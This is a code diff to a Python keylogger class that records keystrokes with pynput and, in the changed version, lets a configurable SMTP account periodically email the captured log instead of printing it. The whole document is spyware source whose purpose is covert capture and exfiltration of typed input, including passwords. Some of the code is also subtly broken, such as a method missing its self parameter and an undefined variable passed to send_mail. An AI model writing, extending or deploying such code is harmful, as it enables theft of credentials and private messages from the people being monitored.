@@ -3,11 +3,16 @@ import pynput.keyboard
 import subprocess, smtplib
 
 class Keylogger:
-    def __init__(self,interval, email, password):
+    
+    def __init__(self, interval):
         self.log = ""
         self.interval = interval
-        self.email = email
-        self.password = password
+
+        self.smtp_server = ''
+        self.smtp_port = 0
+        self.email = ''
+        self.password = ''
+        self.enable_mail_service = False
     
     def append_to_log(key_input):
         self.log += str(key_input)
@@ -23,15 +28,25 @@ class Keylogger:
         append_to_log(current_key)
 
     def report(self):
-        print(self.log)
-        self.send_mail(log)
-
+        if self.enable_mail_service : 
+            self.send_mail(log)
+        else:
+            print(self.log)
+        
         self.log = ''
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
+    def configure_mail(self, email, password, smtp_server, smtp_port):
+        self.email = email
+        self.password = password
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
+
+        self.enable_mail_service = True
+
     def send_mail(self, mesage):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server = smtplib.SMTP(self.smtp_server, self.smtp_port)
         server.starttls()
         server.login(self.email, self.password)
         server.sendmail(self.email,self.email,mesage)
